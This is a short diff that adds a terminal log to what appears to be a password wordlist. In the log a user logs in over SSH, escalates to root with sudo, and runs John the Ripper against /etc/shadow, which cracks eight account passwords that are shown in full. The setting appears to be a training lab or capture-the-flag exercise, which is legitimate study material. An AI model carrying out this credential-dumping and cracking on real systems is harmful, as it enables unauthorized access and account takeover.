@@ -189,4 +189,30 @@ lovelace
 turing 
 lakers
 
+sysadmin@ip-10-0-1-132:~$ ssh sysd@192.168.6.105 -p 2222
+sysd@192.168.6.105's password: 
+Could not chdir to home directory /home/sysd: No such file or directory
+$ whoami
+sysd
+$ sudo su
+
+
+                                                                
+root@042805c9c276:/# john /etc/shadow
+Created directory: /root/.john
+Loaded 8 password hashes with 8 different salts (crypt, generic crypt(3) [?/64])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+1234             (sysd)
+computer         (stallman)
+freedom          (babbage)
+trustno1         (mitnick)
+dragon           (lovelace)
+lakers           (turing)
+passw0rd         (sysadmin)
+Goodluck!        (student)
+8g 0:00:06:13 100% 2/3 0.02141g/s 302.0p/s 309.7c/s 309.7C/s Missy!..Jupiter!
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+root@042805c9c276:/# 
+
 
